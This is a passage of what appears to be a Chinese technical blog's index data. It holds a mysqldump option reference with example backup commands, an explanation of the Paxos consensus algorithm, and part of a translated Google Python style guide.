-h需要导出的主机信息mysqldump -uroot -p --host=localhost --all-databases--ignore-table不导出指定表。指定忽略多个表时，需要重复多次，每次一个表。每个表必须同时指定数据库和表名。例如：--ignore-table=database.table1 --ignore-table=database.table2 ……mysqldump -uroot -p --host=localhost --all-databases --ignore-table=mysql.user--include-master-host-port在--dump-slave产生的'CHANGE MASTER TO..'语句中增加'MASTER_HOST=&lt;host&gt;，MASTER_PORT=&lt;port&gt;' mysqldump -uroot -p --host=localhost --all-databases --include-master-host-port--insert-ignore在插入行时使用INSERT IGNORE语句.mysqldump -uroot -p --host=localhost --all-databases --insert-ignore--lines-terminated-by输出文件的每行用给定字符串划分。与--tab选项一起使用，不能用于--databases和--all-databases选项。mysqldump -uroot -p --host=localhost test test --tab=”/tmp/mysql” --lines-terminated-by=”##”--lock-all-tables, -x提交请求锁定所有数据库中的所有表，以保证数据的一致性。这是一个全局读锁，并且自动关闭--single-transaction 和--lock-tables 选项。mysqldump -uroot -p --host=localhost --all-databases --lock-all-tables--lock-tables, -l开始导出前，锁定所有表。用READ LOCAL锁定表以允许MyISAM表并行插入。对于支持事务的表例如InnoDB和BDB，--single-transaction是一个更好的选择，因为它根本不需要锁定表。请注意当导出多个数据库时，--lock-tables分别为每个数据库锁定表。因此，该选项不能保证导出文件中的表在数据库之间的逻辑一致性。不同数据库表的导出状态可以完全不同。mysqldump -uroot -p --host=localhost --all-databases --lock-tables--log-error附加警告和错误信息到给定文件mysqldump -uroot -p --host=localhost --all-databases --log-error=/tmp/mysqldump_error_log.err--master-data该选项将binlog的位置和文件名追加到输出文件中。如果为1，将会输出CHANGE MASTER 命令；如果为2，输出的CHANGE MASTER命令前添加注释信息。该选项将打开--lock-all-tables 选项，除非--single-transaction也被指定（在这种情况下，全局读锁在开始导出时获得很短的时间；其他内容参考下面的--single-transaction选项）。该选项自动关闭--lock-tables选项。mysqldump -uroot -p --host=localhost --all-databases --master-data=1;mysqldump -uroot -p --host=localhost --all-databases --master-data=2;--max_allowed_packet服务器发送和接受的最大包长度。mysqldump -uroot -p --host=localhost --all-databases --max_allowed_packet=10240--net_buffer_lengthTCP/IP和socket连接的缓存大小。mysqldump -uroot -p --host=localhost --all-databases --net_buffer_length=1024--no-autocommit使用autocommit/commit 语句包裹表。mysqldump -uroot -p --host=localhost --all-databases --no-autocommit--no-create-db, -n只导出数据，而不添加CREATE DATABASE 语句。mysqldump -uroot -p --host=localhost --all-databases --no-create-db--no-create-info, -t只导出数据，而不添加CREATE TABLE 语句。mysqldump -uroot -p --host=localhost --all-databases --no-create-info--no-data, -d不导出任何数据，只导出数据库表结构。mysqldump -uroot -p --host=localhost --all-databases --no-data--no-set-names, -N等同于--skip-set-charsetmysqldump -uroot -p --host=localhost --all-databases --no-set-names--opt等同于--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys 该选项默认开启, 可以用--skip-opt禁用.mysqldump -uroot -p --host=localhost --all-databases --opt--order-by-primary如果存在主键，或者第一个唯一键，对每个表的记录进行排序。在导出MyISAM表到InnoDB表时有效，但会使得导出工作花费很长时间。 mysqldump -uroot -p --host=localhost --all-databases --order-by-primary--password, -p连接数据库密码--pipe(windows系统可用)使用命名管道连接mysqlmysqldump -uroot -p --host=localhost --all-databases --pipe--port, -P连接数据库端口号--protocol使用的连接协议，包括：tcp, socket, pipe, memory.mysqldump -uroot -p --host=localhost --all-databases --protocol=tcp--quick, -q不缓冲查询，直接导出到标准输出。默认为打开状态，使用--skip-quick取消该选项。mysqldump -uroot -p --host=localhost --all-databases mysqldump -uroot -p --host=localhost --all-databases --skip-quick--quote-names,-Q使用（`）引起表和列名。默认为打开状态，使用--skip-quote-names取消该选项。mysqldump -uroot -p --host=localhost --all-databasesmysqldump -uroot -p --host=localhost --all-databases --skip-quote-names--replace使用REPLACE INTO 取代INSERT INTO.mysqldump -uroot -p --host=localhost --all-databases --replace--result-file, -r直接输出到指定文件中。该选项应该用在使用回车换行对（\\\\r\\\\n）换行的系统上（例如：DOS，Windows）。该选项确保只有一行被使用。mysqldump -uroot -p --host=localhost --all-databases --result-file=/tmp/mysqldump_result_file.txt--routines, -R导出存储过程以及自定义函数。mysqldump -uroot -p --host=localhost --all-databases --routines--set-charset添加'SET NAMES default_character_set'到输出文件。默认为打开状态，使用--skip-set-charset关闭选项。mysqldump -uroot -p --host=localhost --all-databases mysqldump -uroot -p --host=localhost --all-databases --skip-set-charset--single-transaction该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN 不会阻塞任何应用程序且能保证导出时数据库的一致性状态。它只适用于多版本存储引擎，仅InnoDB。本选项和--lock-tables 选项是互斥的，因为LOCK TABLES 会使任何挂起的事务隐含提交。要想导出大表的话，应结合使用--quick 选项。mysqldump -uroot -p --host=localhost --all-databases --single-transaction--dump-date将导出时间添加到输出文件中。默认为打开状态，使用--skip-dump-date关闭选项。mysqldump -uroot -p --host=localhost --all-databasesmysqldump -uroot -p --host=localhost --all-databases --skip-dump-date--skip-opt禁用–opt选项.mysqldump -uroot -p --host=localhost --all-databases --skip-opt--socket,-S指定连接mysql的socket文件位置，默认路径/tmp/mysql.sockmysqldump -uroot -p --host=localhost --all-databases --socket=/tmp/mysqld.sock--tab,-T为每个表在给定路径创建tab分割的文本文件。注意：仅仅用于mysqldump和mysqld服务器运行在相同机器上。mysqldump -uroot -p --host=localhost test test --tab=\"/home/mysql\"--tables覆盖--databases (-B)参数，指定需要导出的表名。mysqldump -uroot -p --host=localhost --databases test --tables test--triggers导出触发器。该选项默认启用，用--skip-triggers禁用它。mysqldump -uroot -p --host=localhost --all-databases --triggers--tz-utc在导出顶部设置时区TIME_ZONE='+00:00' ，以保证在不同时区导出的TIMESTAMP 数据或者数据被移动其他时区时的正确性。mysqldump -uroot -p --host=localhost --all-databases --tz-utc--user, -u指定连接的用户名。--verbose, --v输出多种平台信息。--version, -V输出mysqldump版本信息并退出--where, -w只转储给定的WHERE条件选择的记录。请注意如果条件包含命令解释符专用空格或字符，一定要将条件引用起来。mysqldump -uroot -p --host=localhost --all-databases --where=” user=’root’”--xml, -X导出XML格式.mysqldump -uroot -p --host=localhost --all-databases --xml--plugin_dir客户端插件的目录，用于兼容不同的插件版本。mysqldump -uroot -p --host=localhost --all-databases --plugin_dir=”/usr/local/lib/plugin”--default_auth客户端插件默认使用权限。mysqldump -uroot -p --host=localhost --all-databases --default-auth=”/usr/local/lib/plugin/&lt;PLUGIN&gt;”","link":"/2016/10/15/MySQL%E5%AE%9A%E6%97%B6%E9%80%BB%E8%BE%91%E5%A4%87%E4%BB%BD/"},{"title":"Paxos算法","text":"Paxos算法是莱斯利·兰伯特（英语：Leslie Lamport，LaTeX中的“La”）于1990年提出的一种基于消息传递且具有高度容错特性的一致性算法。 问题和假设分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即拜占庭错误的情况。Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。 为描述Paxos算法，Lamport虚拟了一个叫做Paxos的希腊城邦，这个岛按照议会民主制的政治模式制订法律，但是没有人愿意将自己的全部时间和精力放在这种事情上。所以无论是议员，议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间，消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。 对应于分布式系统，议员对应于各个节点，制定的法律对应于系统的状态。各个节点需要进入一个一致的状态，例如在独立Cache的对称多处理器系统中，各个处理器读内存的某个字节时，必须读到同样的一个值，否则系统就违背了一致性的要求。一致性要求对应于法律条文只能有一个版本。议员和服务员的不确定性对应于节点和消息传递通道的不可靠性。 算法算法的提出与证明首先将议员的角色分为proposers，acceptors，和learners（允许身兼数职）。proposers提出提案，提案信息包括提案编号和提议的value；acceptor收到提案后可以接受（accept）提案，若提案获得多数acceptors的接受，则称该提案被批准（chosen）；learners只能“学习”被批准的提案。划分角色后，就可以更精确的定义问题： 决议（value）只有在被proposers提出后才能被批准（未经批准的决议称为“提案（proposal）”）； 在一次Paxos算法的执行实例中，只批准（chosen）一个value； learners只能获得被批准（chosen）的value。 另外还需要保证progress。这一点以后再讨论。 作者通过不断加强上述3个约束（主要是第二个）获得了Paxos算法。 批准value的过程中，首先proposers将value发送给acceptors，之后acceptors对value进行接受（accept）。为了满足只批准一个value的约束，要求经“多数派（majority）”接受的value成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的acceptor，如果每个acceptor只能接受一个value，约束2就能保证。 于是产生了一个显而易见的新约束：1P1：一个acceptor必须接受（accept）第一次收到的提案。注意P1是不完备的。如果恰好一半acceptor接受的提案具有value A，另一半接受的提案具有value B，那么就无法形成多数派，无法批准任何一个value。 约束2并不要求只批准一个提案，暗示可能存在多个提案。只要提案的value是一样的，批准多个提案不违背约束2。于是可以产生约束P2：1P2：一旦一个具有value v的提案被批准（chosen），那么之后批准（chosen）的提案必须具有value v。 注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。 如果P1和P2都能够保证，那么约束2就能够保证。 批准一个value意味着多个acceptor接受（accept）了该value.因此，可以对P2进行加强：1P2a：一旦一个具有value v的提案被批准（chosen），那么之后任何acceptor再次接受（accept）的提案必须具有value v。 由于通信是异步的，P2a和P1会发生冲突。如果一个value被批准后，一个proposer和一个acceptor从休眠中苏醒，前者提出一个具有新的value的提案。根据P1，后者应当接受，根据P2a，则不应当接受，这中场景下P2a和P1有矛盾。于是需要换个思路，转而对proposer的行为进行约束：1P2b：一旦一个具有value v的提案被批准（chosen），那么以后任何proposer提出的提案必须具有value v。 由于acceptor能接受的提案都必须由proposer提出，所以P2b蕴涵了P2a，是一个更强的约束。但是根据P2b难以提出实现手段。因此需要进一步加强P2b。 假设一个编号为m的value v已经获得批准（chosen），来看看在什么情况下对任何编号为n（n&gt;m）的提案都含有value v。因为m已经获得批准（chosen），显然存在一个acceptors的多数派C，他们都接受（accept）了v。考虑到任何多数派都和C具有至少一个公共成员，可以找到一个蕴涵P2b的约束P2c：12P2c：如果一个编号为n的提案具有value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于n 的任何提案，要么他们已经接受（accept）的所有编号小于n的提案中编号最大的那个提案具有value v。 可以用数学归纳法证明P2c蕴涵P2b：假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v； 若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w’,根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w’。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。 P2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。 算法的内容要满足P2c的约束，proposer提出一个提案前，首先要和足以形成多数派的acceptors进行通信，获得他们进行的最近一次接受（accept）的提案（prepare过程），之后根据回收的信息决定这次提案的value，形成提案开始投票。当获得多数acceptors接受（accept）后，提案获得批准（chosen），由proposer将这个消息告知learner。这个简略的过程经过进一步细化后就形成了Paxos算法。 在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系。可以用多种方法实现这一点，例如将序数和proposer的名字拼接起来。如何做到这一点不在Paxos算法讨论的范围之内。 如果一个没有chosen过任何proposer提案的acceptor在prepare过程中回答了一个proposer针对提案n的问题，但是在开始对n进行投票前，又接受（accept）了编号小于n的另一个提案（例如n-1），如果n-1和n具有不同的value，这个投票就会违背P2c。因此在prepare过程中，acceptor进行的回答同时也应包含承诺：不会再接受（accept）编号小于n的提案。这是对P1的加强：1P1a：当且仅当acceptor没有回应过编号大于n的prepare请求时，acceptor接受（accept）编号为n的提案。现在已经可以提出完整的算法了。 决议的提出与批准通过一个决议分为两个阶段： prepare阶段： proposer选择一个提案编号n并将prepare请求发送给acceptors中的一个多数派； acceptor收到prepare消息后，如果提案的编号大于它已经回复的所有prepare消息，则acceptor将自己上次接受的提案回复给proposer，并承诺不再回复小于n的提案； 批准阶段： 当一个proposer收到了多数acceptors对prepare的回复后，就进入批准阶段。它要向回复prepare请求的acceptors发送accept请求，包括编号n和根据P2c决定的value（如果根据P2c没有已经接受的value，那么它可以自由决定value）。 在不违背自己向其他proposer的承诺的前提下，acceptor收到accept请求后即接受这个请求。 这个过程在任何时候中断都可以保证正确性。例如如果一个proposer发现已经有其他proposers提出了编号更高的提案，则有必要中断这个过程。因此为了优化，在上述prepare过程中，如果一个acceptor发现存在一个更高编号的提案，则需要通知proposer，提醒其中断这次提案。 实例用实际的例子来更清晰地描述上述过程：有A1, A2, A3, A4, A5 5位议员，就税率问题进行决议。议员A1决定将税率定为10%,因此它向所有人发出一个草案。这个草案的内容是：1现有的税率是什么?如果没有决定，则建议将其定为10%.时间：本届议会第3年3月15日;提案者：A1在最简单的情况下，没有人与其竞争;信息能及时顺利地传达到其它议员处。于是, A2-A5回应：1我已收到你的提案，等待最终批准而A1在收到2份回复后就发布最终决议：1税率已定为10%,新的提案不得再讨论本问题。这实际上退化为二阶段提交协议。现在我们假设在A1提出提案的同时, A5决定将税率定为20%:1现有的税率是什么?如果没有决定，则建议将其定为20%.时间：本届议会第3年3月15日;提案者：A5草案要通过侍从送到其它议员的案头. A1的草案将由4位侍从送到A2-A5那里。现在，负责A2和A3的侍从将草案顺利送达，负责A4和A5的侍从则不上班. A5的草案则顺利的送至A3和A4手中。 现在, A1, A2, A3收到了A1的提案; A3, A4, A5收到了A5的提案。按照协议, A1, A2, A4, A5将接受他们收到的提案，侍从将拿着1我已收到你的提案，等待最终批准的回复回到提案者那里。而A3的行为将决定批准哪一个。 情况一假设A1的提案先送到A3处，而A5的侍从决定放假一段时间。于是A3接受并派出了侍从. A1等到了两位侍从，加上它自己已经构成一个多数派，于是税率10%将成为决议. A1派出侍从将决议送到所有议员处：1税率已定为10%,新的提案不得再讨论本问题。A3在很久以后收到了来自A5的提案。由于税率问题已经讨论完毕，他决定不再理会。但是他要抱怨一句：1税率已在之前的投票中定为10%,你不要再来烦我!这个回复对A5可能有帮助，因为A5可能因为某种原因很久无法与与外界联系了。当然更可能对A5没有任何作用，因为A5可能已经从A1处获得了刚才的决议。 情况二依然假设A1的提案先送到A3处，但是这次A5的侍从不是放假了，只是中途耽搁了一会。这次, A3依然会将”接受”回复给A1.但是在决议成型之前它又收到了A5的提案。这时协议有两种处理方式：1.如果A5的提案更早，按照传统应该由较早的提案者主持投票。现在看来两份提案的时间一样（本届议会第3年3月15日）。但是A5是个惹不起的大人物。于是A3回复：1我已收到您的提案，等待最终批准，但是您之前有人提出将税率定为10%,请明察。于是, A1和A5都收到了足够的回复。这时关于税率问题就有两个提案在同时进行。但是A5知道之前有人提出税率为10%.于是A1和A5都会向全体议员广播：1税率已定为10%,新的提案不得再讨论本问题。一致性得到了保证。 A5是个无足轻重的小人物。这时A3不再理会他, A1不久后就会广播税率定为10%. 情况三在这个情况中，我们将看见，根据提案的时间及提案者的权势决定是否应答是有意义的。在这里，时间和提案者的权势就构成了给提案编号的依据。这样的编号符合”任何两个提案之间构成偏序”的要求。 A1和A5同样提出上述提案，这时A1可以正常联系A2和A3; A5也可以正常联系这两个人。这次A2先收到A1的提案; A3则先收到A5的提案. A5更有权势。 在这种情况下，已经回答A1的A2发现有比A1更有权势的A5提出了税率20%的新提案，于是回复A5说：1我已收到您的提案，等待最终批准。而回复了A5的A3发现新的提案者A1是个小人物，不予理会。 A1没有达到多数，A5达到了，于是A5将主持投票，决议的内容是A5提出的税率20%. 如果A3决定平等地对待每一位议员，对A1做出”你之前有人提出将税率定为20%”的回复，则将造成混乱。这种情况下A1和A5都将试图主持投票，但是这次两份提案的内容不同。 这种情况下, A3若对A1进行回复，只能说：1有更大的人物关注此事，请等待他做出决定。 另外，在这种情况下, A4与外界失去了联系。等到他恢复联系，并需要得知税率情况时，他（在最简单的协议中）将提出一个提案：1现有的税率是什么?如果没有决定，则建议将其定为15%.时间：本届议会第3年4月1日;提案者：A4这时，（在最简单的协议中）其他议员将会回复：1税率已在之前的投票中定为20%,你不要再来烦我! 决议的发布一个显而易见的方法是当acceptors批准一个value时，将这个消息发送给所有learner。但是这个方法会导致消息量过大。由于假设没有Byzantine failures，learners可以通过别的learners获取已经通过的决议。因此acceptors只需将批准的消息发送给指定的某一个learner，其他learners向它询问已经通过的决议。这个方法降低了消息量，但是指定learner失效将引起系统失效。 因此acceptors需要将accept消息发送给learners的一个子集，然后由这些learners去通知所有learners。但是由于消息传递的不确定性，可能会没有任何learner获得了决议批准的消息。当learners需要了解决议通过情况时，可以让一个proposer重新进行一次提案。注意一个learner可能兼任proposer。 Progress的保证根据上述过程当一个proposer发现存在编号更大的提案时将终止提案。这意味着提出一个编号更大的提案会终止之前的提案过程。如果两个proposer在这种情况下都转而提出一个编号更大的提案，就可能陷入活锁，违背了Progress的要求。这种情况下的解决方案是选举出一个leader，仅允许leader提出提案。但是由于消息传递的不确定性，可能有多个proposer自认为自己已经成为leader。Lamport在The Part-Time Parliament一文中描述并解决了这个问题。","link":"/2016/11/07/Paxos%E7%AE%97%E6%B3%95/"},{"title":"Python 编码规范","text":"Google官方英文版编码规范, 请移步 Google Style Guide以下代码中 Yes 表示推荐，No 表示不推荐。 分号不要在行尾加分号, 也不要用分号将两条命令放在同一行。 行长度每行不超过80个字符以下情况除外：1、长的导入模块语句2、注释里的URL 不要使用反斜杠连接行。Python会将 圆括号, 中括号和花括号中的行隐式的连接起来 , 你可以利用这个特点. 如果需要, 你可以在表达式外围增加一对额外的圆括号。12345推荐: foo_bar(self, width, height, color='black', design=None, x='foo', emphasis=None, highlight=0) if (width == 0 and height == 0 and color == 'red' and emphasis == 'strong'): 如果一个文本字符串在一行放不下, 可以使用圆括号来实现隐式行连接:12x = ('这是一个非常长非常长非常长非常长 ' '非常长非常长非常长非常长非常长非常长的字符串') 在注释中，如果必要，将长的URL放在一行上。12Yes: # See details at # http://www.example.com/us/developer/documentation/api/content/v2.0/csv_file_name_extension_full_specification.html123No: # See details at # http://www.example.com/us/developer/documentation/api/content/\\ # v2.0/csv_file_name_extension_full_specification.html注意上面例子中的元素缩进; 你可以在本文的 [缩进] 部分找到解释. 括号宁缺毋滥的使用括号除非是用于实现行连接, 否则不要在返回语句或条件语句中使用括号. 不过在元组两边使用括号是可以的.12345678910Yes: if foo: bar() while x: x = bar() if x and y: bar() if not x: bar() return foo for (x, y) in dict.items(): ...12345No: if (x): bar() if not(x): bar() return (foo) 缩进用4个空格来缩进代码绝对不要用tab, 也不要tab和空格混用. 对于行连接的情况, 你应该要么垂直对齐换行的元素(见[行长度]部分的示例), 或者使用4空格的悬挂式缩进(这时第一行不应该有参数):12345678910111213141516171819202122Yes: # 与起始变量对齐 foo = long_function_name(var_one, var_two, var_three, var_four) # 字典中与起始值对齐 foo = { long_dictionary_key: value1 + value2, ... } # 4 个空格缩进，第一行不需要 foo = long_function_name( var_one, var_two, var_three, var_four) # 字典中 4 个空格缩进 foo = { long_dictionary_key: long_dictionary_value, ... }123456789101112131415No: # 第一行有空格是禁止的 foo = long_function_name(var_one, var_two, var_three, var_four) # 2 个空格是禁止的 foo = long_function_name( var_one, var_two, var_three, var_four) # 字典中没有处理缩进 foo = { long_dictionary_key: long_dictionary_value, ... } 空行顶级定义之间空两行, 方法定义之间空一行.顶级定义之间空两行, 比如函数或者类定义. 方法定义, 类定义与第一个方法之间, 都应该空一行. 函数或方法中, 某些地方要是你觉得合适, 就空一行. 空格按照标准的排版规范来使用标点两边的空格括号内不要有空格.按照标准的排版规范来使用标点两边的空格1Yes: spam(ham[1], {eggs: 2}, [])1No: spam( ham[ 1 ], { eggs: 2 }, [ ] ) 不要在逗号, 分号, 冒号前面加空格, 但应该在它们后面加(除了在行尾).123Yes: if x == 4: print x, y x, y = y, x123No: if x == 4 : print x , y x , y = y , x 参数列表, 索引或切片的左括号前不应加空格.12Yes: spam(1)no: spam (1)12Yes: dict['key'] = list[index]No: dict ['key'] = list [index] 在二元操作符两边都加上一个空格, 比如赋值(=), 比较(==, &lt;, &gt;, !=, &lt;&gt;, &lt;=, &gt;=, in, not in, is, is not), 布尔(and, or, not). 至于算术操作符两边的空格该如何使用, 需要你自己好好判断. 不过两侧务必要保持一致.12Yes: x == 1No: x&lt;1 当’=’用于指示关键字参数或默认参数值时, 不要在其两侧使用空格.12Yes: def complex(real, imag=0.0): return magic(r=real, i=imag)No: def complex(real, imag = 0.0): return magic(r = real, i = imag) 不要用空格来垂直对齐多行间的标记, 因为这会成为维护的负担(适用于:, #, =等):12345678Yes: foo = 1000 # 注释 long_name = 2 # 注释不需要对齐 dictionary = { \"foo\": 1, \"long_name\": 2, }12345678No: foo = 1000 # 注释 long_name = 2 # 注释不需要对齐 dictionary = { \"foo\" : 1, \"long_name\": 2, } Shebang大部分.py文件不必以#!作为文件的开始. 根据 PEP-394 , 程序的main文件应该以 #!/usr/bin/python2或者 #!/usr/bin/python3开始.(译者注: 在计算机科学中, Shebang (也称为Hashbang)是一个由井号和叹号构成的字符串行(#!), 其出现在文本文件的第一行的前两个字符. 在文件中存在Shebang的情况下, 类Unix操作系统的程序载入器会分析Shebang后的内容, 将这些内容作为解释器指令, 并调用该指令, 并将载有Shebang的文件路径作为该解释器的参数. 例如, 以指令#!/bin/sh开头的文件在执行时会实际调用/bin/sh程序.) !先用于帮助内核找到Python解释器, 但是在导入模块时, 将会被忽略. 因此只有被直接执行的文件中才有必要加入#!. 注释确保对模块, 函数, 方法和行内注释使用正确的风格 1、文档字符串Python有一种独一无二的的注释方式: 使用文档字符串. 文档字符串是包, 模块, 类或函数里的第一个语句. 这些字符串可以通过对象的(双下滑线doc双下滑线)成员被自动提取, 并且被pydoc所用. (你可以在你的模块上运行pydoc试一把, 看看它长什么样). 我们对文档字符串的惯例是使用三重双引号”””( PEP-257 ). 一个文档字符串应该这样组织: 首先是一行以句号, 问号或惊叹号结尾的概述(或者该文档字符串单纯只有一行). 接着是一个空行. 接着是文档字符串剩下的部分, 它应该与文档字符串的第一行的第一个引号对齐. 下面有更多文档字符串的格式化规范. 2、模块每个文件应该包含一个许可样板. 根据项目使用的许可(例如, Apache 2.0, BSD, LGPL, GPL), 选择合适的样板. 3、函数和方法下文所指的函数,包括函数, 方法, 以及生成器.一个函数必须要有文档字符串, 除非它满足以下条件:（1）外部不可见（2）非常短小（3）简单明了 文档字符串应该包含函数做什么, 以及输入和输出的详细描述. 通常, 不应该描述”怎么做”, 除非是一些复杂的算法. 文档字符串应该提供足够的信息, 当别人编写代码调用该函数时, 他不需要看一行代码, 只要看文档字符串就可以了. 对于复杂的代码, 在代码旁边加注释会比使用文档字符串更有意义. 关于函数的几个方面应该在特定的小节中进行描述记录， 这几个方面如下文所述. 每节应该以一个标题行开始. 标题行以冒号结尾. 除标题行外, 节的其他内容应被缩进2个空格. Args:列出每个参数的名字, 并在名字后使用一个冒号和一个空格, 分隔对该参数的描述.如果描述太长超过了单行80字符,使用2或者4个空格的悬挂缩进(与文件其他部分保持一致). 描述应该包括所需的类型和含义. 如果一个函数接受foo(可变长度参数列表)或者**bar (任意关键字参数), 应该详细列出foo和**bar. Returns: (或者 Yields: 用于生成器)描述返回值的类型和语义. 如果函数返回None, 这一部分可以省略. Raises:列出与接口有关的所有异常. 123456789101112131415161718192021222324252627282930def fetch_bigtable_rows(big_table, keys, other_silly_variable=None): \"\"\"Fetches rows from a Bigtable. Retrieves rows pertaining to the given keys from the Table instance represented by big_table. Silly things may happen if other_silly_variable is not None. Args: big_table: An open Bigtable Table instance. keys: A sequence of strings representing the key of each table row to fetch. other_silly_variable: Another optional variable, that has a much longer name than the other args, and which does nothing. Returns: A dict mapping keys to the corresponding table row data fetched. Each row is represented as a tuple of strings. For example: {'Serak': ('Rigel VII', 'Preparer'), 'Zim': ('Irk', 'Invader'), 'Lrrr': ('Omicron Persei 8', 'Emperor')} If a key from the keys argument is missing from the dictionary, then that row was not found in the table. Raises: IOError: An error occurred accessing the bigtable.Table object. \"\"\" pass 4、类类应该在其定义下有一个用于描述该类的文档字符串. 如果你的类有公共属性(Attributes), 那么文档中应该有一个属性(Attributes)段. 并且应该遵守和函数参数相同的格式. 123456789101112131415161718class SampleClass(object): \"\"\"Summary of class here. Longer class information.... Longer class information.... Attributes: likes_spam: A boolean indicating if we like SPAM or not. eggs: An integer count of the eggs we have laid. \"\"\" def __init__(self, likes_spam=False): \"\"\"Inits SampleClass with blah.\"\"\" self.likes_spam = likes_spam self.eggs = 0 def public_method(self): \"\"\"Performs operation blah.\"\"\" 5、块注释和行注释最需要写注释的是代码中那些技巧性的部分. 如果你在下次 代码审查 的时候必须解释一下, 那么你应该现在就给它写注释. 对于复杂的操作, 应该在其操作开始前写上若干行注释. 对于不是一目了然的代码, 应在其行尾添加注释.123456# We use a weighted dictionary search to find out where i is in# the array. We extrapolate position based on the largest num# in the array and the array size and then do binary search to# get the exact number.if i &amp; (i-1) == 0: # true iff i is a power of 2 为了提高可读性, 注释应该至少离开代码2个空格.另一方面, 绝不要描述代码. 假设阅读代码的人比你更懂Python, 他只是不知道你的代码要做什么.12# BAD COMMENT: Now go through the b array and make sure whenever i occurs# the next element is i+1 类如果一个类不继承自其它类, 就显式的从object继承. 嵌套类也一样.123456789101112Yes: class SampleClass(object): pass class OuterClass(object): class InnerClass(object): pass class ChildClass(ParentClass): \"\"\"Explicitly inherits from another class already.\"\"\"12345678No: class SampleClass: pass class OuterClass: class InnerClass: pass 继承自 object 是为了使属性(properties)正常工作, 并且这样可以保护你的代码, 使其不受Python 3000的一个特殊的潜在不兼容性影响. 这样做也定义了一些特殊的方法, 这些方法实现了对象的默认语义, 包括1__new__, __init__, __delattr__, __getattribute__, __setattr__, __hash__, __repr__, and __str__ 字符串12345Yes: x = a + b x = '%s, %s!' % (imperative, expletive) x = '{}, {}!'.format(imperative, expletive) x = 'name: %s; score: %d' % (name, n) x = 'name: {}; score: {}'.format(name, n) 1234No: x = '%s%s' % (a, b) # use + in this case x = '{}{}'.format(a, b) # use + in this case x = imperative + ', ' + expletive + '!' x = 'name: ' + name + '; score: ' + str(n) 避免在循环中用+和+=操作符来累加字符串. 由于字符串是不可变的, 这样做会创建不必要的临时对象, 并且导致二次方而不是线性的运行时间. 作为替代方案, 你可以将每个子串加入列表, 然后在循环结束后用 .join 连接列表. (也可以将每个子串写入一个 cStringIO.StringIO 缓存中.)12345Yes: items = ['&lt;table&gt;'] for last_name, first_name in employee_list: items.append('&lt;tr&gt;&lt;td&gt;%s, %s&lt;/td&gt;&lt;/tr&gt;' % (last_name, first_name)) items.append('&lt;/table&gt;') employee_table = ''.join(items)1234No: employee_table = '&lt;table&gt;' for last_name, first_name in employee_list: employee_table += '&lt;tr&gt;&lt;td&gt;%s, %s&lt;/td&gt;&lt;/tr&gt;' % (last_name, first_name) employee_table += '&lt;/table&gt;'在同一个文件中, 保持使用字符串引号的一致性. 使用单引号’或者双引号”之一用以引用字符串, 并在同一文件中沿用. 在字符串内可以使用另外一种引号, 以避免在字符串中使用. PyLint已经加入了这一检查.1234Yes: Python('Why are you hiding your eyes?') Gollum(\"I'm scared of lint errors.\") Narrator('\"Good!\" thought a happy Python reviewer.')1234No: Python(\"Why are you hiding your eyes?\") Gollum('The lint. It burns. It burns us.') Gollum(\"Always the great lint. Watching. Watching.\") 为多行字符串使用三重双引号”””而非三重单引号’’’. 当且仅当项目中使用单引号’来引用字符串时, 才可能会使用三重’’’为非文档字符串的多行字符串来标识引用. 文档字符串必须使用三重双引号”””. 不过要注意, 通常用隐式行连接更清晰, 因为多行字符串与程序其他部分的缩进方式不一致. 123Yes: print (\"This is much nicer.\\n\" \"Do it this way.\\n\") 1234No: print \"\"\"This is pretty ugly. Don't do this. \"\"\" 文件和sockets在文件和sockets结束时, 显式的关闭它. 除文件外, sockets或其他类似文件的对象在没有必要的情况下打开, 会有许多副作用, 例如:1、它们可能会消耗有限的系统资源, 如文件描述符. 如果这些资源在使用后没有及时归还系统, 那么用于处理这些对象的代码会将资源消耗殆尽.2、持有文件将会阻止对于文件的其他诸如移动、删除之类的操作.3、仅仅是从逻辑上关闭文件和sockets, 那么它们仍然可能会被其共享的程序在无意中进行读或者写操作. 只有当它们真正被关闭后, 对于它们尝试进行读或者写操作将会跑出异常, 